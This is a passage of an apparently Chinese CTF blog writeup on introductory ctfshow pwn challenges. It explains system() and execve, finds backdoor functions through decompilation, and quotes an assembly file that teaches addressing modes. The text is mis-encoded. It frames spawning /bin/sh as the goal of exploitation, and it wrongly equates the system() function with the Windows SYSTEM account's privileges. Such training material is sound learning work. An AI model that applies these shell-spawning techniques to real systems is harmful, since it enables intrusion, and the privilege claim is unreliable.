&lt;p&gt;system()å‡½æ•°å…ˆforkä¸€ä¸ªå­è¿›ç¨‹ï¼Œåœ¨è¿™ä¸ªå­è¿›ç¨‹ä¸­è°ƒç”¨/bin/sh -cæ¥æ‰§è¡ŒcommandæŒ‡å®šçš„å‘½ä»¤ã€‚/bin/shåœ¨ç³»ç»Ÿä¸­ä¸€èˆ¬æ˜¯ä¸ªè½¯é“¾æ¥ï¼ŒæŒ‡å‘dashæˆ–è€…bashç­‰å¸¸ç”¨çš„shellï¼Œ-cé€‰é¡¹æ˜¯å‘Šè¯‰shellä»å­—ç¬¦ä¸²commandä¸­è¯»å–è¦æ‰§è¡Œçš„å‘½ä»¤ï¼ˆshellå°†æ‰©å±•commandä¸­çš„ä»»ä½•ç‰¹æ®Šå­—ç¬¦ï¼‰ã€‚çˆ¶è¿›ç¨‹åˆ™è°ƒç”¨waitpid()å‡½æ•°æ¥ä¸ºå˜æˆåƒµå°¸çš„å­è¿›ç¨‹æ”¶å°¸ï¼Œè·å¾—å…¶ç»“æŸçŠ¶æ€ï¼Œç„¶åå°†è¿™ä¸ªç»“æŸçŠ¶æ€è¿”å›ç»™system()å‡½æ•°çš„è°ƒç”¨è€…ã€‚&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-note&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt; çš„å·¥ä½œåŸç†å¯ç®€åŒ–ä¸ºï¼š
&lt;strong&gt;é€šè¿‡ &lt;code&gt;system&lt;/code&gt; å‡½æ•°åˆ›å»ºå­è¿›ç¨‹ â†’ å­è¿›ç¨‹æ‰§è¡Œ &lt;code&gt;/bin/sh&lt;/code&gt; ç¨‹åº â†’ å¯åŠ¨äº¤äº’å¼ shell ç¯å¢ƒ&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¹Ÿæ˜¯æ¼æ´åˆ©ç”¨ä¸­æœ€å¸¸ç”¨çš„&lt;strong&gt;è·å–æƒé™&lt;/strong&gt;çš„æ–¹å¼ â€”â€” æ— è®ºé€šè¿‡æ ˆæº¢å‡ºã€ROP è¿˜æ˜¯ ret2libcï¼Œæœ€ç»ˆç›®æ ‡éƒ½æ˜¯è®©ç¨‹åºæ‰§è¡Œè¿™æ¡è¯­å¥ï¼ˆæˆ–ç­‰æ•ˆçš„ç³»ç»Ÿè°ƒç”¨ï¼‰ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;pwn_003&#34;&gt;PWN_003
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼š &lt;a class=&#34;link&#34; href=&#34;PWN_003&#34; &gt;PWN_003&lt;/a&gt; å“ªä¸€ä¸ªå‡½æ•°æ‰èƒ½è¯»å–flagï¼Ÿ&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/9.png&#34;
	width=&#34;835&#34;
	height=&#34;485&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/9_hu_cf2d18ee43fc45c9.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/9_hu_4af22d79b2909177.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;172&#34;
		data-flex-basis=&#34;413px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;é€šè¿‡å‰é¢çš„åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹å‡ºæ¥é€‰é¡¹â€6â€ä¸ºæˆ‘ä»¬æ‰€éœ€è¦çš„åé—¨å‡½æ•°ï¼Œå…¶ä»–çš„å‡ä¸ä¼šå¾—åˆ°æˆ‘ä»¬æ‰€æƒ³è¦çš„flagï¼Œåœ¨systemå‡½æ•°é‡Œé¢çš„å‘½ä»¤éƒ½æ˜¯åœ¨ç»ˆç«¯æ‰§è¡Œçš„ï¼Œèµ‹äºˆsystemæƒé™è¾ƒå¤§ï¼Œåœ¨æˆ‘æ‰€å†™çš„æ–‡ç« é‡Œï¼ŒåŒ…æ‹¬PWNå…¥é—¨çŸ¥è¯†è®²è§£å’Œæ“ä½œç³»ç»Ÿéƒ½æ˜ç¡®æŒ‡å‡ºSYSTEMæ˜¯ä¸æ“ä½œç³»ç»Ÿå†…æ ¸æ¥è§¦çš„ï¼Œæ¯”Administratorsçš„æƒé™è¿˜è¦ç¨å¤§ã€‚&lt;/p&gt;
&lt;p&gt;ç›´æ¥é€‰6ç§’äº†ï¼Œä½†é™¤è¿™ç§é€åˆ†çš„ï¼Œå…¶å®è¿˜éœ€è¦ææ¸…è¿è¡Œçš„é€»è¾‘ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/10.png&#34;
	width=&#34;1390&#34;
	height=&#34;554&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/10_hu_c9707c3fe7bf59e8.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/10_hu_b592fb61e24a27ee.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;IDAx64ä½ç¨‹åºåç¼–è¯‘&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;250&#34;
		data-flex-basis=&#34;602px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è·Ÿè¿›ä¸€ä¸‹menuå‡½æ•°é‡Œè¾¹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/11.png&#34;
	width=&#34;726&#34;
	height=&#34;280&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/11_hu_3d734164c38877e4.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/11_hu_685776f269a503fb.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;259&#34;
		data-flex-basis=&#34;622px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å›åˆ°mainè·Ÿè¿›ä¸€ä¸‹è¿™ä¸ªâ€œ6â€çš„å‡½æ•°ï¼Œçœ‹çœ‹é‡Œå¤´æ˜¯ä¸æ˜¯çœŸåœ¨æ‰§è¡Œsystemåé—¨å‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/12.png&#34;
	width=&#34;744&#34;
	height=&#34;240&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/12_hu_9db861ef6fbcf71d.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/12_hu_9d996ee2d6fc5f89.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;310&#34;
		data-flex-basis=&#34;744px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/13.png&#34;
	width=&#34;501&#34;
	height=&#34;119&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/13_hu_b70d12fb710b2ef9.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/13_hu_c960f6a7ed96e8b6.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;421&#34;
		data-flex-basis=&#34;1010px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°ï¼Œç¡®å®æ˜¯æ‰§è¡Œäº†ã€‚é‚£ä¹ˆæˆ‘ä»¬ä¹Ÿå°±èƒ½å¾—åˆ°æˆ‘ä»¬éœ€è¦çš„flagã€‚&lt;/p&gt;
&lt;h3 id=&#34;pwn_004&#34;&gt;PWN_004
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼š &lt;a class=&#34;link&#34; href=&#34;PWN_004&#34; &gt;PWN_004&lt;/a&gt; æˆ–è®¸éœ€è¦å…ˆå¾—åˆ°æŸä¸ªç¥ç§˜å­—ç¬¦&lt;/p&gt;
&lt;p&gt;çœŸå¤Ÿé˜´é—´çš„ï¼Œå•¥ä¹Ÿä¸ç»™äº†ï¼Œæ‰ç¬¬å‡ é“å•Šå°±ä¸Šå¼ºåº¦äº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/14.png&#34;
	width=&#34;1060&#34;
	height=&#34;574&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/14_hu_fb649637a5b6a11b.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/14_hu_c8ef954931f877ea.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;184&#34;
		data-flex-basis=&#34;443px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;checksecçœ‹çœ‹ï¼Œç„¶åIDAåç¼–è¯‘çœ‹çœ‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/15.png&#34;
	width=&#34;481&#34;
	height=&#34;159&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/15_hu_5f0f4805cec82d66.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/15_hu_e21b6ee28222ffbe.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;302&#34;
		data-flex-basis=&#34;726px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;64ä½äºŒè¿›åˆ¶ä¿æŠ¤å…¨å¼€&amp;hellip;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/16.png&#34;
	width=&#34;753&#34;
	height=&#34;341&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/16_hu_ca7b56f27f75a918.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/16_hu_6ad185fb146bb9a2.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;220&#34;
		data-flex-basis=&#34;529px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°æœ‰å‡ ä¸ªä¼¼æ›¾ç›¸è¯†çš„å‡½æ•°ï¼šstrcpyï¼ˆå¤åˆ¶å‡½æ•°æŠŠxxå¤åˆ¶ç»™s1ï¼Œä¹Ÿå¯èµ·åˆ°èµ‹å€¼çš„ä½œç”¨ï¼‰ã€strcmpï¼ˆæ¯”è¾ƒå‡½æ•°ï¼Œå¯¹æ¯”ï¼Œåˆ¤æ–­ä½œç”¨ï¼‰ã€execveï¼ˆï¼‰ï¼›æˆ‘æ›¾è¯´è¿‡æ±‡ç¼–è¯­è¨€çš„cmpå°±æœ‰æ¯”è¾ƒä½œç”¨ï¼Œè¿™ä¹Ÿç®—æ˜¯ç±»æ¯”å§ï¼Œå›æƒ³èµ·æ¥çš„ï¼Œä¸è¿‡ç”¨AIæœä¸€ä¸‹ä¹Ÿè¡Œã€‚&lt;/p&gt;
&lt;p&gt;æ¥è¯´ä¸‹execveå§ï¼Œä¸Šé¢˜è®²è¿‡systemå‡½æ•°ï¼Œè¿™ä¸ªä¹Ÿåº”è¯¥çŸ¥é“çš„ï¼š&lt;/p&gt;
&lt;p&gt;&lt;code&gt;execve&lt;/code&gt; æ˜¯ Unix/Linux ç³»ç»Ÿä¸­æœ€æ ¸å¿ƒçš„&lt;strong&gt;ç³»ç»Ÿè°ƒç”¨ï¼ˆsystem callï¼‰&lt;/strong&gt; ä¹‹ä¸€ï¼Œç”¨äº&lt;strong&gt;åœ¨å½“å‰è¿›ç¨‹ä¸­åŠ è½½å¹¶æ‰§è¡Œä¸€ä¸ªæ–°çš„ç¨‹åº&lt;/strong&gt;ï¼Œæ›¿æ¢å½“å‰è¿›ç¨‹çš„ä»£ç ã€æ•°æ®å’Œå †æ ˆï¼Œå®ç°è¿›ç¨‹ â€œå˜èº«â€ã€‚å®ƒæ˜¯æ‰€æœ‰ç¨‹åºå¯åŠ¨å’Œæ›¿æ¢çš„åº•å±‚åŸºç¡€ï¼ŒåŒ…æ‹¬ &lt;code&gt;system&lt;/code&gt; å‡½æ•°ã€shell æ‰§è¡Œå‘½ä»¤ç­‰æœ€ç»ˆéƒ½ä¼šä¾èµ– &lt;code&gt;execve&lt;/code&gt; å®Œæˆã€‚&lt;/p&gt;
&lt;p&gt;çœ‹åˆ°è¿™æ®µä»£ç ï¼Œå¤§è‡´æ„æ€æ˜¯ï¼Œè®©s1ç­‰äºâ€œCTFshowPWNâ€è¿™æ®µå­—ç¬¦ä¸²ï¼Œç„¶ååˆ°ifåˆ¤æ–­è¯­å¥è¿™è¿›è¡Œæ¯”è¾ƒï¼š&lt;strong&gt;å¦‚æœs1å’Œs2ç›¸ç­‰&lt;/strong&gt;ï¼ˆè¿™é‡Œçš„ï¼ä¸æ˜¯æˆ‘ä»¬Cè¯­è¨€ä¸­çš„â€œä¸â€çš„æ„æ€å•Šï¼‰ï¼Œå°±æ‰§è¡Œexecveå‡½æ•°ï¼Œå¯åŠ¨äº¤äº’æƒé™ï¼Œä»è€Œå¾—åˆ°flagã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/17.png&#34;
	width=&#34;890&#34;
	height=&#34;506&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/17_hu_cb606be9be72c140.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/17_hu_e8a05d11d9a5f65f.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;175&#34;
		data-flex-basis=&#34;422px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è‡³æ­¤ï¼šä¸‹ä¸€èŠ‚å°±å¼€å§‹å‰ç½®åŸºç¡€äº†ï¼Œå¼€å§‹åº”ç”¨&lt;a class=&#34;link&#34; href=&#34;https://expl0rer.top/p/pwn-1/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;PWN-1&lt;/a&gt;ã€&lt;a class=&#34;link&#34; href=&#34;https://expl0rer.top/p/pwn-2/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;PWN-2&lt;/a&gt;ã€&lt;a class=&#34;link&#34; href=&#34;https://expl0rer.top/p/pwn-3/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;PWN-3&lt;/a&gt;æ‰€å­¦çš„çŸ¥è¯†äº†ã€‚&lt;/p&gt;
&lt;h2 id=&#34;å‰ç½®åŸºç¡€&#34;&gt;å‰ç½®åŸºç¡€
&lt;/h2&gt;&lt;h3 id=&#34;pwn_005&#34;&gt;PWN_005
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šè¿è¡Œæ­¤æ–‡ä»¶ï¼Œå°†å¾—åˆ°çš„å­—ç¬¦ä¸²ä»¥ctfshow{xxxxx}æäº¤ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚ï¼šè¿è¡Œæ–‡ä»¶å è¾“å‡ºçš„å†…å®¹ä¸º Hello_World&lt;/p&gt;
&lt;p&gt;æäº¤çš„flagå€¼ä¸ºï¼šctfshow{Hello_World}&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æ³¨ï¼šè®¡ç»„åŸç†é¢˜å‹åç»­çš„flagä¸­åœ°å€å­—æ¯å¤§å†™&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;PWN_005%5cWelcome_to_CTFshow&#34; &gt;Welcome_to_CTFshow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;PWN_005%5cWelcome_to_CTFshow.asm&#34; &gt;Welcome_to_CTFshow.asm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Welcome_to_CTFshow.asmæ–‡æœ¬æ‰“å¼€åå‘ç°æ˜¯æ±‡ç¼–è¯­è¨€æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;section&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;.data&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;msg&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;db&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Welcome_to_CTFshow_PWN&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;section&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;.text&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;global&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;_start&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;_start:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;; ç«‹å³å¯»å€æ–¹å¼&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;11&lt;/span&gt;         &lt;span class=&#34;c1&#34;&gt;; å°†11èµ‹å€¼ç»™eax&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;114504&lt;/span&gt;     &lt;span class=&#34;c1&#34;&gt;; eaxåŠ ä¸Š114504&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;sub&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;; eaxå‡å»1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;; å¯„å­˜å™¨å¯»å€æ–¹å¼&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ebx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x36d&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;; å°†0x36dèµ‹å€¼ç»™ebx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;edx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ebx&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;; å°†ebxçš„å€¼èµ‹å€¼ç»™edx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;; ç›´æ¥å¯»å€æ–¹å¼&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;msg&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;; å¯„å­˜å™¨é—´æ¥å¯»å€æ–¹å¼&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;esi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;msg&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;; å°†msgçš„åœ°å€èµ‹å€¼ç»™esi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;esi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;; å°†esiæ‰€æŒ‡å‘çš„åœ°å€çš„å€¼èµ‹å€¼ç»™eax&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;; å¯„å­˜å™¨ç›¸å¯¹å¯»å€æ–¹å¼&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ecx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;msg&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;; å°†msgçš„åœ°å€èµ‹å€¼ç»™ecx&lt;/span&gt;
